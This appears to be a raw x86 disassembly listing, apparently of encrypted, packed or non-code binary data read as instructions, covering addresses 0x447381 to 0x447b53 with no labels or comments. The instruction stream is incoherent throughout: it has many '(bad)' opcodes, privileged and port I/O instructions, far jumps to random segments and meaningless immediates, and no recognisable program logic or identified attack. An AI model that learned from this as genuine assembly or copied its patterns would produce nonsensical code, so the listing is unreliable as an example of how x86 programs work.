  447381:	dec    ebp
  447382:	(bad)  
  447383:	fst    QWORD PTR [ebx+0x66376205]
  447389:	xchg   BYTE PTR [edx+0x3ca38862],ah
  44738f:	cs push 0xffffffdc
  447392:	ds addr16 mov ah,0x44
  447396:	push   cs
  447397:	pop    ss
  447398:	adc    dh,BYTE PTR ds:0xb3f4d417
  44739e:	mov    eax,0x5a990b27
  4473a3:	aam    0x2a
  4473a5:	mov    ds:0x5eba718,al
  4473aa:	inc    eax
  4473ab:	int3   
  4473ac:	xchg   ebx,eax
  4473ad:	mov    bh,0xd7
  4473af:	ins    DWORD PTR es:[edi],dx
  4473b0:	and    cl,dh
  4473b2:	pusha  
  4473b3:	mov    ch,0x26
  4473b5:	imul   esi,DWORD PTR [ecx-0xe1626f4],0x58
  4473bc:	push   0xea8b1f5e
  4473c1:	cdq    
  4473c2:	not    DWORD PTR [edx+ebp*8+0x3a891f0e]
  4473c9:	xchg   edi,eax
  4473ca:	add    al,0x56
  4473cc:	dec    esi
  4473cd:	mov    dh,0x57
  4473cf:	aam    0x59
  4473d1:	fs popf 
  4473d3:	mov    BYTE PTR [ecx+0x38],dh
  4473d6:	inc    ebp
  4473d7:	mov    WORD PTR [edi+0x287397ed],es
  4473dd:	arpl   WORD PTR [esi-0x27],di
  4473e0:	mov    al,0xb8
  4473e2:	int3   
  4473e3:	stos   DWORD PTR es:[edi],eax
  4473e4:	mov    dl,0xc5
  4473e6:	lods   eax,DWORD PTR ds:[esi]
  4473e7:	sub    al,BYTE PTR [ebp+0x7caff4a5]
  4473ed:	mov    ebx,0x77ac2560
  4473f2:	push   cs
  4473f3:	iret   
  4473f4:	and    al,0x11
  4473f6:	cld    
  4473f7:	lahf   
  4473f8:	pop    ecx
  4473f9:	fdiv   st,st(0)
  4473fb:	push   ebp
  4473fc:	add    DWORD PTR [esi+ebx*2+0x66eaf7cf],ebx
  447403:	sbb    ecx,DWORD PTR [edi-0x41af9b09]
  447409:	xor    eax,0xff3c29
  44740e:	into   
  44740f:	cmp    ebp,DWORD PTR [edx+0x28]
  447412:	and    esp,DWORD PTR [edi+eax*1+0x36f49383]
  447419:	pop    eax
  44741a:	pop    ebp
  44741b:	loope  0x447497
  44741d:	and    bl,BYTE PTR [esi+0x74d8b68]
  447423:	cdq    
  447424:	jmp    0xd59cdc2b
  447429:	adc    esi,eax
  44742b:	cli    
  44742c:	je     0x447448
  44742e:	push   ds
  44742f:	xchg   ebx,eax
  447430:	int3   
  447431:	sub    edx,DWORD PTR [ebp-0x2eabd891]
  447437:	repnz mov eax,ds:0x29632202
  44743d:	jnp    0x447448
  44743f:	dec    esi
  447440:	(bad)  
  447441:	das    
  447442:	push   ds
  447443:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  447444:	(bad)
  447447:	cld    
  447448:	sbb    BYTE PTR [edx],ah
  44744a:	cmp    al,0xd6
  44744c:	mov    ebx,0x24a0ff72
  447451:	call   0x65c7:0x34fe76d
  447458:	sti    
  447459:	push   esp
  44745a:	ret    
  44745b:	pop    edx
  44745c:	cli    
  44745d:	in     eax,dx
  44745e:	push   ds
  44745f:	rol    ah,cl
  447461:	push   es
  447462:	mov    ecx,0x7f616abf
  447467:	in     al,dx
  447468:	fstp   DWORD PTR [esi]
  44746a:	and    DWORD PTR [si+0x64],edx
  44746e:	or     DWORD PTR [ebx+0x20cf0488],ebx
  447474:	aam    0xff
  447476:	retf   
  447477:	aam    0x5c
  447479:	(bad)  
  44747a:	sbb    BYTE PTR [ebx+0x18b0fe8d],ah
  447480:	pop    ecx
  447481:	push   edi
  447482:	popa   
  447483:	int    0x67
  447485:	ins    BYTE PTR es:[edi],dx
  447486:	sub    BYTE PTR [edi+eax*8+0x5c95b591],bl
  44748d:	xchg   BYTE PTR [eax+0x61],ah
  447490:	imul   edx,DWORD PTR [eax-0x5c],0x1229870
  447497:	mov    eax,ds:0xe4f14e26
  44749c:	mov    ebx,esp
  44749e:	hlt    
  44749f:	or     DWORD PTR [ebx-0x773fee51],edi
  4474a5:	rol    DWORD PTR [eax],cl
  4474a7:	scas   al,BYTE PTR es:[edi]
  4474a8:	push   ss
  4474a9:	std    
  4474aa:	ins    DWORD PTR es:[edi],dx
  4474ab:	mov    eax,ds:0x28f0c16a
  4474b0:	xchg   ebx,eax
  4474b1:	add    cl,BYTE PTR [esi+0x1]
  4474b4:	loopne 0x44745f
  4474b6:	adc    esp,DWORD PTR [ecx+0x41]
  4474b9:	mov    edi,0x20d1af1f
  4474be:	dec    edx
  4474bf:	lds    ebp,FWORD PTR [esi]
  4474c1:	push   ebp
  4474c2:	jle    0x447497
  4474c4:	lods   al,BYTE PTR ds:[esi]
  4474c5:	bound  edx,QWORD PTR [eax+0x3d]
  4474c8:	or     ah,BYTE PTR [edx-0x4546672b]
  4474ce:	jge    0x44745e
  4474d0:	mov    DWORD PTR [edi-0x28],ecx
  4474d3:	cli    
  4474d4:	cwde   
  4474d5:	sbb    al,0x1a
  4474d7:	retf   0x5e6
  4474da:	in     al,dx
  4474db:	sub    BYTE PTR [edx+0x17efeb76],bh
  4474e1:	xor    ebx,DWORD PTR [esi]
  4474e3:	adc    ebx,DWORD PTR [ebp-0x40]
  4474e6:	or     eax,0xbd21484
  4474eb:	in     al,dx
  4474ec:	jbe    0x4474fc
  4474ee:	mov    edx,0xe2a8c39e
  4474f3:	push   ebp
  4474f4:	outs   dx,BYTE PTR ds:[esi]
  4474f5:	ret    
  4474f6:	lods   al,BYTE PTR ds:[esi]
  4474f7:	mov    WORD PTR [edx+ecx*4],ds
  4474fa:	pop    ds
  4474fb:	std    
  4474fc:	mov    bl,0x3e
  4474fe:	pop    ds
  4474ff:	or     dl,BYTE PTR [edx]
  447501:	lods   al,BYTE PTR ds:[esi]
  447502:	or     eax,0x1a4fb0d4
  447507:	clc    
  447508:	add    eax,0x89094e20
  44750d:	inc    ebp
  44750e:	add    BYTE PTR [ebp-0x53627daf],0xe5
  447515:	add    cl,dh
  447517:	push   0xd8e6e551
  44751c:	out    dx,al
  44751d:	add    DWORD PTR [esi],ebx
  44751f:	imul   eax,DWORD PTR [edx+0x45],0xdd4c7d16
  447526:	(bad)  
  447527:	aam    0xfa
  447529:	outs   dx,BYTE PTR ds:[esi]
  44752a:	sti    
  44752b:	out    0xb8,al
  44752d:	retf   0x8ae0
  447530:	mov    bh,BYTE PTR [ecx]
  447532:	ja     0x4474e1
  447534:	std    
  447535:	jmp    DWORD PTR [ebx+0xcdea0f]
  44753b:	in     eax,0x11
  44753d:	add    eax,ecx
  44753f:	ror    BYTE PTR [edi],1
  447541:	push   esi
  447542:	jmp    0x82de:0x14b2c1e3
  447549:	leave  
  44754a:	mov    ebp,0x60cd8c1f
  44754f:	add    al,0x8
  447551:	clc    
  447552:	adc    eax,0xf1414bd6
  447557:	ins    BYTE PTR es:[edi],dx
  447558:	nop
  447559:	pop    ecx
  44755a:	rcr    DWORD PTR ds:0x291fc7e0,1
  447560:	sbb    ebp,DWORD PTR [eax+0xa]
  447563:	inc    ecx
  447564:	adc    BYTE PTR [ecx+0x12],0x8b
  447568:	in     al,0xbe
  44756a:	xchg   ebp,eax
  44756b:	inc    eax
  44756c:	mov    DWORD PTR [edi-0x62be367e],edi
  447572:	mov    ch,0x5f
  447574:	jns    0x4474fb
  447576:	pusha  
  447577:	jmp    0x6a280fea
  44757c:	add    DWORD PTR ds:0x2f2def5b,0xffffff9e
  447583:	or     cl,dh
  447585:	jo     0x447507
  447587:	jecxz  0x447588
  447589:	pop    ecx
  44758a:	or     al,0x5e
  44758c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44758d:	add    dl,dh
  44758f:	js     0x447523
  447591:	std    
  447592:	add    eax,0xc1e1895a
  447597:	sbb    bh,BYTE PTR [ecx+0x6ab137cc]
  44759d:	add    esi,DWORD PTR [eax+0x44]
  4475a0:	mov    esp,0x198877a7
  4475a5:	jmp    DWORD PTR [eax-0x1d]
  4475a8:	out    0x1,al
  4475aa:	popf   
  4475ab:	adc    dh,BYTE PTR [ebx+eax*4+0x4978d295]
  4475b2:	pop    ecx
  4475b3:	sbb    DWORD PTR [edx],esi
  4475b5:	cwde   
  4475b6:	adc    al,0x97
  4475b8:	bswap  ecx
  4475ba:	lock mov ah,0xec
  4475bd:	pop    ecx
  4475be:	push   ds
  4475bf:	in     eax,0xe6
  4475c1:	outs   dx,DWORD PTR ds:[esi]
  4475c2:	out    dx,al
  4475c3:	adc    al,0xa0
  4475c5:	push   edx
  4475c6:	mov    eax,0xaa8e16d5
  4475cb:	fnsave [edi+0x31]
  4475ce:	and    ecx,ebx
  4475d0:	mov    BYTE PTR [ecx-0x56c11b78],dl
  4475d6:	jnp    0x4475a1
  4475d8:	sar    BYTE PTR ds:0xb33c6ea4,0x9a
  4475df:	add    eax,0x54825fb6
  4475e4:	inc    ebx
  4475e5:	sbb    bl,BYTE PTR [esi+0x1e33d45f]
  4475eb:	or     eax,0xed755088
  4475f0:	mov    eax,0xbad5f6c5
  4475f5:	ss (bad) 
  4475f7:	jb     0x4475b2
  4475f9:	or     bh,BYTE PTR [edi+eax*8]
  4475fc:	bound  ebx,QWORD PTR [esi+ebx*1-0x65]
  447600:	mov    ebp,0x1aac9275
  447605:	in     eax,0x4b
  447607:	aad    0xc7
  447609:	add    ch,BYTE PTR [ebx-0x3de7715d]
  44760f:	mov    ds:0x375c4b88,al
  447614:	arpl   si,cx
  447616:	xor    DWORD PTR [edi-0x5faffd51],ebp
  44761c:	jae    0x447675
  44761e:	mov    dh,0x1d
  447620:	inc    ebp
  447621:	ins    DWORD PTR es:[edi],dx
  447622:	ja     0x447665
  447624:	sbb    ebx,DWORD PTR [ebx+0x1d]
  447627:	cmp    ch,ch
  447629:	add    eax,0x1efae3dc
  44762e:	or     al,0x6
  447631:	fldenv [eax-0x31]
  447634:	test   DWORD PTR [esi+0x5fd8fa32],ecx
  44763a:	xchg   esp,eax
  44763b:	xlat   BYTE PTR ds:[ebx]
  44763c:	das    
  44763d:	dec    ebp
  44763e:	popa   
  44763f:	push   es
  447640:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  447642:	int    0xd4
  447644:	mov    esp,0x303acfb9
  447649:	dec    edx
  44764a:	cdq    
  44764b:	aam    0x19
  44764d:	jmp    0x4736:0x82f094f7
  447654:	mov    BYTE PTR [edi-0x3f],bh
  447657:	leave  
  447658:	js     0x447608
  44765a:	pop    esi
  44765b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44765c:	sub    al,BYTE PTR [ebx]
  44765e:	inc    esp
  44765f:	inc    edx
  447660:	adc    al,0x5f
  447662:	mov    ah,0xcc
  447664:	jmp    0x955ba252
  447669:	jecxz  0x44763b
  44766b:	fst    st(0)
  44766d:	inc    ebp
  44766e:	push   ds
  44766f:	into   
  447670:	les    ebx,FWORD PTR [eax-0x35062b4c]
  447676:	fmulp  st(6),st
  447678:	stc    
  447679:	lods   eax,DWORD PTR ds:[esi]
  44767a:	cmp    cl,al
  44767c:	mov    BYTE PTR [ebp-0x3816767e],ah
  447682:	xchg   ecx,eax
  447683:	jg     0x44767c
  447685:	add    eax,0xcae3595a
  44768a:	xchg   ebp,eax
  44768b:	pop    ss
  44768c:	setg   BYTE PTR [ebp+0x4d]
  447690:	pop    eax
  447691:	fistp  QWORD PTR [edi-0x72]
  447694:	adc    al,BYTE PTR [ebx]
  447696:	psrld  mm4,QWORD PTR [ebp+0x1c]
  44769a:	repnz daa 
  44769c:	cmp    ax,0x463a
  4476a0:	js     0x4476d5
  4476a2:	sahf   
  4476a3:	repz mov dl,0x19
  4476a6:	push   eax
  4476a7:	sbb    BYTE PTR [eax],cl
  4476a9:	xor    eax,0x9cf2ce89
  4476ae:	jp     0x44764d
  4476b0:	(bad)  
  4476b1:	mov    esi,0xc1f05711
  4476b6:	xor    al,0x3f
  4476b8:	sub    al,cl
  4476ba:	add    esp,DWORD PTR [eax-0x4ae018ab]
  4476c0:	in     eax,dx
  4476c1:	call   0xd5d2:0x6610a61a
  4476c8:	addr16 (bad) 
  4476ca:	jb     0x44766f
  4476cc:	jecxz  0x44766b
  4476ce:	rcr    eax,0x88
  4476d1:	ror    ebx,1
  4476d3:	shl    BYTE PTR [esp+ebp*2],0x2a
  4476d7:	lahf   
  4476d8:	clc    
  4476d9:	loopne 0x4476ce
  4476db:	aad    0xb3
  4476dd:	mov    cs,WORD PTR [ebx-0x39]
  4476e0:	jns    0x4476c6
  4476e2:	pop    es
  4476e3:	sub    cl,BYTE PTR [eax+0x1af1bf0f]
  4476e9:	imul   eax,ebx,0xffffffbf
  4476ec:	cdq    
  4476ed:	add    BYTE PTR [esi],ah
  4476ef:	outs   dx,BYTE PTR ds:[esi]
  4476f0:	jno    0x4476c8
  4476f2:	or     DWORD PTR [eax-0x43],edi
  4476f5:	xchg   ebp,eax
  4476f6:	xchg   edx,eax
  4476f7:	out    0x38,eax
  4476f9:	outs   dx,BYTE PTR ds:[esi]
  4476fa:	mov    ah,0xd5
  4476fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4476fd:	imul   esi,DWORD PTR [ecx],0xfffffff5
  447700:	mov    bl,BYTE PTR [eax+edi*8+0x11]
  447704:	push   es
  447705:	test   BYTE PTR [ebp-0x5547942b],0x7a
  44770c:	cli    
  44770d:	mov    ebp,0xef8879e8
  447712:	test   ebx,0x5dd18498
  447718:	add    al,0x3
  44771a:	cwde   
  44771b:	mov    sp,0x70ec
  44771f:	adc    DWORD PTR [ecx],eax
  447721:	ror    DWORD PTR [ebx],1
  447723:	jge    0x4476ad
  447725:	fst    st(0)
  447727:	(bad)
  44772c:	and    eax,0x3f175203
  447731:	xchg   esp,eax
  447732:	cmp    DWORD PTR [esi],0xef1f9f26
  447738:	retf   0x1c1d
  44773b:	es pushf 
  44773d:	sub    esp,DWORD PTR [ecx-0x2c]
  447740:	dec    edi
  447741:	pop    ebx
  447742:	or     eax,0xa4f9a3dc
  447747:	dec    edx
  447748:	mov    bl,ah
  44774a:	or     DWORD PTR [edi+0x7fc32475],ecx
  447750:	push   cs
  447751:	add    bh,BYTE PTR [edi+eax*8]
  447754:	iret   
  447755:	fild   QWORD PTR [ebp+0x19]
  447758:	ins    BYTE PTR es:[edi],dx
  447759:	sub    ebx,DWORD PTR [edi]
  44775b:	jnp    0x447782
  44775d:	pushf  
  44775e:	fidivr DWORD PTR [edi-0x2a684070]
  447764:	adc    eax,DWORD PTR [ebx-0x1a95d7ce]
  44776a:	popf   
  44776b:	int3   
  44776c:	ins    BYTE PTR es:[edi],dx
  44776d:	jg     0x447716
  44776f:	inc    ebp
  447770:	push   es
  447771:	lahf   
  447772:	imul   esp,DWORD PTR [ebp+0x74],0xed57150f
  447779:	out    dx,eax
  44777a:	into   
  44777b:	xchg   DWORD PTR [ecx+0x43],esi
  44777e:	pop    ds
  44777f:	mov    bh,0x4d
  447781:	dec    edx
  447782:	ins    DWORD PTR es:[edi],dx
  447783:	adc    ch,0xc5
  447786:	jnp    0x4477ec
  447788:	test   al,0x94
  44778b:	aam    0xc6
  44778d:	(bad)  
  44778e:	cmp    DWORD PTR [edi+0x6ec323fe],0x5d8c941
  447798:	stos   BYTE PTR es:[edi],al
  447799:	add    ecx,DWORD PTR [ebx+esi*2+0x41054480]
  4477a0:	and    BYTE PTR [ebx+0x466cb27c],bl
  4477a6:	and    eax,0x1f65d8a2
  4477ab:	fwait
  4477ac:	out    0xf9,al
  4477ae:	inc    esi
  4477af:	loopne 0x447739
  4477b1:	ins    DWORD PTR es:[edi],dx
  4477b2:	into   
  4477b3:	(bad)  
  4477b4:	shr    DWORD PTR [edi],cl
  4477b6:	push   eax
  4477b7:	(bad)  
  4477b9:	mul    BYTE PTR [esi-0x2b]
  4477bc:	retf   
  4477bd:	pop    ss
  4477be:	icebp  
  4477bf:	inc    ebx
  4477c0:	dec    esp
  4477c1:	ffree  st(5)
  4477c3:	mov    DWORD PTR gs:[edi-0x58e568f9],eax
  4477ca:	jle    0x447840
  4477cc:	test   DWORD PTR [edx],eax
  4477ce:	push   eax
  4477cf:	in     eax,0x8d
  4477d1:	cdq    
  4477d2:	push   ds
  4477d3:	test   edi,ebp
  4477d5:	push   es
  4477d6:	sbb    edi,DWORD PTR [edx]
  4477d8:	sbb    al,al
  4477da:	mov    esp,0x60fa90b1
  4477df:	aaa    
  4477e0:	push   0x447b7fa0
  4477e5:	add    bl,BYTE PTR [edx-0x4f]
  4477e8:	retf   0x37a5
  4477eb:	and    eax,0xa51f3f09
  4477f0:	fwait
  4477f1:	shr    dl,1
  4477f3:	out    0xf0,eax
  4477f5:	push   0x7bf6d5c1
  4477fa:	push   ds
  4477fb:	inc    eax
  4477fc:	stos   DWORD PTR es:[edi],eax
  4477fd:	xchg   edx,eax
  4477fe:	fstp   DWORD PTR [ebx-0x2ee73ac0]
  447804:	mov    BYTE PTR [ecx+0x12],dh
  447807:	inc    edi
  447808:	jns    0x4477e1
  44780a:	add    ebp,DWORD PTR [ebp-0x48a3e34c]
  447810:	pop    ebx
  447811:	not    DWORD PTR [edx]
  447813:	jbe    0x44788e
  447815:	daa    
  447816:	and    eax,0x628a641b
  44781b:	xchg   ecx,eax
  44781c:	jmp    0x682d6132
  447821:	(bad)  
  447822:	cmp    bh,ah
  447824:	mov    ebx,0x274c2c02
  447829:	push   ebx
  44782a:	scas   eax,DWORD PTR es:[edi]
  44782b:	pop    ebp
  44782c:	jle    0x447851
  44782e:	pop    ds
  44782f:	sub    ebx,edx
  447831:	icebp  
  447832:	stos   DWORD PTR es:[edi],eax
  447833:	xor    cl,ah
  447835:	jecxz  0x447818
  447837:	jne    0x4477bf
  447839:	out    0x84,al
  44783b:	popf   
  44783c:	jl     0x44783f
  44783e:	sahf   
  44783f:	shr    DWORD PTR [ebx+eiz*2+0xa],cl
  447843:	mov    edi,0xfa921958
  447848:	mov    DWORD PTR [edi+0x34],ebx
  44784b:	sub    al,0x22
  44784d:	mov    ebx,0x2fe34b1
  447852:	cwde   
  447853:	and    bh,ch
  447855:	addr16 mov esi,0x5e9f1e8f
  44785b:	mov    ds:0x9145e46e,eax
  447860:	mov    ch,bh
  447862:	pushf  
  447863:	push   ds
  447864:	ror    BYTE PTR [ebp+0x5e],0xd4
  447868:	jmp    0x4478ca
  44786a:	dec    esi
  44786b:	scas   eax,DWORD PTR es:[edi]
  44786c:	ja     0x44786b
  44786e:	dec    edx
  44786f:	bound  ecx,QWORD PTR [ecx+0x73da4f51]
  447875:	ins    DWORD PTR es:[edi],dx
  447876:	add    eax,0x34024ace
  44787b:	out    0x3a,al
  44787d:	jge    0x44789d
  44787f:	pop    esp
  447880:	(bad)
  447883:	dec    edi
  447884:	mov    BYTE PTR [ebx+0x62],bl
  447887:	ret    
  447888:	mov    ah,0xac
  44788a:	enter  0x2b93,0x3
  44788e:	mov    al,ds:0x3313ab2b
  447893:	lds    ebp,FWORD PTR [edi]
  447895:	mov    ebp,0x6ed7a361
  44789a:	add    BYTE PTR [ecx-0x70f1a011],cl
  4478a0:	leave  
  4478a1:	add    eax,0x9ea51352
  4478a6:	pop    ecx
  4478a7:	rcl    BYTE PTR [eax-0x7f],cl
  4478aa:	pop    ds
  4478ab:	pop    edi
  4478ac:	rol    ch,cl
  4478ae:	inc    eax
  4478af:	pop    esp
  4478b0:	sahf   
  4478b1:	mov    ebx,0xcf7bd445
  4478b6:	jp     0x447915
  4478b8:	sub    cl,cl
  4478ba:	(bad)  
  4478bc:	mov    bl,al
  4478be:	pop    esp
  4478bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4478c0:	out    0x41,eax
  4478c2:	clc    
  4478c3:	jge    0x44792a
  4478c5:	add    dh,BYTE PTR [eax]
  4478c7:	repz aam 0xfe
  4478ca:	pop    esi
  4478cb:	sbb    DWORD PTR [esi-0x52149210],esi
  4478d1:	inc    esi
  4478d2:	retf   
  4478d3:	aad    0x62
  4478d5:	add    al,0xe2
  4478d7:	dec    eax
  4478d8:	sti    
  4478d9:	inc    ecx
  4478da:	(bad)  
  4478db:	mov    WORD PTR [ebp+0x3],fs
  4478de:	push   ss
  4478df:	jecxz  0x4478ce
  4478e1:	mov    ebp,0x4e6b0b4c
  4478e6:	push   edi
  4478e7:	inc    ebp
  4478e8:	jae    0x447964
  4478ea:	lahf   
  4478eb:	mov    ebp,0x451a15c1
  4478f0:	inc    ebx
  4478f1:	sub    al,0x40
  4478f3:	sbb    DWORD PTR [esi],esi
  4478f5:	rcr    edx,cl
  4478f7:	rol    BYTE PTR [edi+ebp*4-0x31],cl
  4478fb:	or     ch,BYTE PTR [eax+0x77e9ae72]
  447901:	add    BYTE PTR [edx+esi*1-0x7616761b],bl
  447908:	and    al,0xa
  44790a:	cmp    al,0x21
  44790c:	mov    BYTE PTR [edi],dl
  44790e:	sub    eax,0x4aa2bc
  447913:	dec    edi
  447914:	ret    0x8e02
  447917:	adc    eax,0xb9b36bb5
  44791c:	xor    DWORD PTR [ebx+0x1f],esi
  44791f:	jmp    0x3e29ed5e
  447924:	nop
  447925:	pop    es
  447926:	adc    ah,0x9c
  447929:	pop    edi
  44792a:	iret   
  44792b:	daa    
  44792c:	cwde   
  44792d:	(bad)  [ebx-0x34]
  447930:	mov    ebp,ebp
  447932:	pop    ecx
  447933:	dec    esi
  447934:	xchg   esi,eax
  447935:	in     eax,0x62
  447937:	js     0x4478cc
  447939:	add    cl,dh
  44793b:	xchg   esp,eax
  44793c:	arpl   si,bx
  44793e:	sti    
  44793f:	lods   al,BYTE PTR ds:[esi]
  447940:	mov    bl,0xb3
  447942:	pop    ebx
  447943:	mov    bl,0x10
  447945:	add    eax,0x4f2e91e0
  44794a:	lea    ecx,[eax-0x2cfe7428]
  447950:	mov    ah,BYTE PTR [edi-0x642b561b]
  447956:	es (bad) 
  447959:	ja     0x447979
  44795b:	sub    eax,0x81bc55e
  447960:	mov    ds:0xfdd59102,al
  447965:	aaa    
  447966:	dec    edi
  447967:	mov    bl,0x3c
  447969:	push   0x7c
  44796b:	fisttp WORD PTR [eax-0x24e36abf]
  447971:	ja     0x44792c
  447973:	cdq    
  447974:	mul    cl
  447976:	push   ss
  447977:	mov    eax,0x39073844
  44797c:	or     BYTE PTR [edx+eax*4],cl
  44797f:	sti    
  447980:	mov    esi,0x888d1619
  447985:	xlat   BYTE PTR ds:[ebx]
  447986:	nop
  447987:	out    0x59,al
  447989:	in     al,dx
  44798a:	std    
  44798b:	arpl   WORD PTR [edi-0x713651fe],dx
  447991:	xchg   ebp,eax
  447992:	aas    
  447993:	ror    DWORD PTR fs:[edi+0x73],0x69
  447998:	js     0x4479c4
  44799a:	aad    0x4b
  44799c:	mov    DWORD PTR [ebx-0x3c4ba7fd],ebx
  4479a2:	cmp    eax,0x5ac195d4
  4479a7:	and    al,0xb6
  4479a9:	or     BYTE PTR [eax-0x30],bh
  4479ac:	xchg   ebp,eax
  4479ad:	adc    DWORD PTR [ebx+0x339cddd6],edx
  4479b3:	adc    al,0x83
  4479b5:	inc    esi
  4479b7:	xchg   ebp,eax
  4479b8:	inc    eax
  4479b9:	inc    DWORD PTR [edx-0x15196f56]
  4479bf:	cwde   
  4479c0:	pop    es
  4479c1:	(bad)  
  4479c2:	call   0x6c890fcc
  4479c7:	jmp    0x438331fa
  4479cc:	out    0x1a,al
  4479ce:	fidivr WORD PTR ds:0xd5e042da
  4479d4:	mov    al,ds:0xeef5e5c2
  4479d9:	in     eax,dx
  4479da:	in     eax,dx
  4479db:	sahf   
  4479dc:	(bad)  
  4479dd:	das    
  4479de:	and    edi,DWORD PTR [edx-0x1c]
  4479e1:	pop    edx
  4479e2:	push   ecx
  4479e3:	cmc    
  4479e4:	or     ecx,DWORD PTR ds:[ebx-0x2b]
  4479e8:	sub    eax,DWORD PTR [ecx+0x17]
  4479eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4479ec:	fisttp WORD PTR [esi-0x40771d48]
  4479f2:	xor    eax,0xc2d2e4ff
  4479f7:	jg     0x447a35
  4479f9:	add    ecx,DWORD PTR [esp+ebp*4+0x7b]
  4479fd:	jne    0x447a37
  4479ff:	ja     0x4479c9
  447a01:	and    bl,BYTE PTR [edi]
  447a03:	and    DWORD PTR [ecx],eax
  447a05:	lods   eax,DWORD PTR ds:[esi]
  447a06:	not    DWORD PTR [eax+0x6d]
  447a09:	ins    DWORD PTR es:[edi],dx
  447a0a:	inc    esi
  447a0b:	add    esp,esp
  447a0d:	aad    0x50
  447a0f:	aam    0x15
  447a11:	mov    eax,edi
  447a13:	int3   
  447a14:	mov    gs,ebx
  447a16:	fst    st(4)
  447a18:	mov    dl,0x33
  447a1a:	jb     0x447a40
  447a1c:	leave  
  447a1d:	aaa    
  447a1e:	inc    esp
  447a1f:	xchg   ebp,eax
  447a20:	mov    gs,WORD PTR [edi]
  447a22:	test   BYTE PTR [edi+0x44],dh
  447a25:	aam    0x17
  447a27:	and    DWORD PTR [edx-0x3],eax
  447a2a:	aaa    
  447a2b:	inc    ebp
  447a2c:	iret   
  447a2d:	sbb    al,0xb2
  447a2f:	pop    ss
  447a30:	aaa    
  447a31:	into   
  447a32:	repnz mov esp,0xa01f6b59
  447a38:	mov    BYTE PTR [edi-0x75],ch
  447a3b:	pop    ss
  447a3c:	les    ebp,FWORD PTR [ebx+0x8f43f3e]
  447a42:	sbb    esi,DWORD PTR [eax-0x2ca532ea]
  447a48:	or     BYTE PTR [eax],ah
  447a4a:	and    eax,0xff86cfbf
  447a4f:	clc    
  447a50:	das    
  447a51:	loopne 0x447ab3
  447a53:	mov    ch,0x67
  447a55:	stos   DWORD PTR es:[edi],eax
  447a56:	jns    0x447a44
  447a58:	mov    al,ds:0x5a9cf3fc
  447a5d:	int    0x69
  447a5f:	aam    0xc4
  447a61:	sbb    DWORD PTR [edx+esi*8],0x23918aa7
  447a68:	cmp    eax,0xbc51de03
  447a6d:	pop    es
  447a6e:	cmp    BYTE PTR [eax],ah
  447a70:	rol    BYTE PTR [edx],1
  447a72:	dec    edx
  447a73:	fs jbe 0x447a4c
  447a76:	add    al,0xf7
  447a78:	sbb    eax,0x890b0cd0
  447a7d:	stos   DWORD PTR es:[edi],eax
  447a7e:	fs push 0x1dcdfac1
  447a84:	repnz add bl,BYTE PTR [esi+0x531d1131]
  447a8b:	pop    esi
  447a8c:	push   esp
  447a8d:	jmp    DWORD PTR [edx+0x47]
  447a90:	(bad)  
  447a91:	mov    ds:0x9d87c95,al
  447a96:	iret   
  447a97:	scas   al,BYTE PTR es:[edi]
  447a98:	pop    ebx
  447a99:	mov    ds,WORD PTR [ebx+0x7c098960]
  447a9f:	es or  al,0x30
  447aa2:	mov    DWORD PTR [edx],edx
  447aa4:	mov    BYTE PTR [ebx],bl
  447aa6:	add    eax,0x75a9d4e2
  447aab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  447aac:	jl     0x447b09
  447aae:	mov    al,0x9e
  447ab0:	jle    0x447ab5
  447ab2:	mov    dl,0xdb
  447ab4:	shr    dh,1
  447ab6:	lods   al,BYTE PTR ds:[esi]
  447ab7:	lds    ecx,FWORD PTR [ebx-0x2d409837]
  447abd:	jge    0x447b06
  447abf:	xchg   ebx,eax
  447ac0:	pusha  
  447ac1:	xchg   ecx,eax
  447ac2:	mov    ds:0x822da689,al
  447ac7:	aad    0x38
  447ac9:	and    dh,ch
  447acb:	rcr    BYTE PTR [edi+edx*8],0x18
  447acf:	fdivrp st(5),st
  447ad1:	xor    edi,DWORD PTR [ecx]
  447ad3:	scas   al,BYTE PTR es:[edi]
  447ad4:	dec    ecx
  447ad5:	lods   eax,DWORD PTR ds:[esi]
  447ad6:	cli    
  447ad7:	int    0x6
  447ad9:	cmp    eax,0x884c7b21
  447ade:	clc    
  447adf:	mov    al,0x98
  447ae1:	add    eax,0xe5badf62
  447ae6:	scas   eax,DWORD PTR es:[edi]
  447ae7:	add    eax,0x4f647da9
  447aec:	call   0xed96f2a1
  447af1:	rcr    ah,cl
  447af3:	inc    esp
  447af4:	repz sub al,0xbc
  447af7:	xchg   ebp,eax
  447af8:	and    BYTE PTR [ebp+0x7b],ah
  447afb:	in     eax,dx
  447afc:	dec    ecx
  447afd:	xchg   esi,eax
  447afe:	xor    BYTE PTR [edx-0xae00449],cl
  447b04:	pop    es
  447b05:	push   eax
  447b06:	mov    DWORD PTR [ecx],ecx
  447b08:	push   es
  447b09:	push   edi
  447b0a:	inc    edi
  447b0b:	mov    eax,0x6020333d
  447b10:	push   cs
  447b11:	xchg   DWORD PTR [ebx+0x64bca693],esp
  447b17:	pop    ebx
  447b18:	clc    
  447b19:	sbb    al,BYTE PTR [esi]
  447b1b:	repnz mov BYTE PTR [ecx+0xd399574],ah
  447b22:	mov    bl,0xd1
  447b24:	ins    BYTE PTR es:[edi],dx
  447b25:	push   0xffffff9e
  447b27:	fwait
  447b28:	lock es push eax
  447b2b:	cld    
  447b2c:	inc    esi
  447b2d:	mov    DWORD PTR [edi+edx*8],edi
  447b30:	jno    0x447b6d
  447b32:	jge    0x447ba6
  447b34:	cld    
  447b35:	cmp    ecx,esp
  447b37:	aam    0x4f
  447b39:	xlat   BYTE PTR ds:[ebx]
  447b3a:	jle    0x447b33
  447b3c:	adc    BYTE PTR [esi+ebx*4-0x2a],cl
  447b40:	xlat   BYTE PTR ds:[ebx]
  447b41:	test   bh,dl
  447b43:	outs   dx,DWORD PTR ds:[esi]
  447b44:	inc    eax
  447b45:	lock mov cl,0xec
  447b48:	xchg   esp,eax
  447b49:	js     0x447b69
  447b4b:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  447b4d:	inc    ebx
  447b4e:	mov    ds:0xe30a36ee,al
  447b53:	aad    0x3
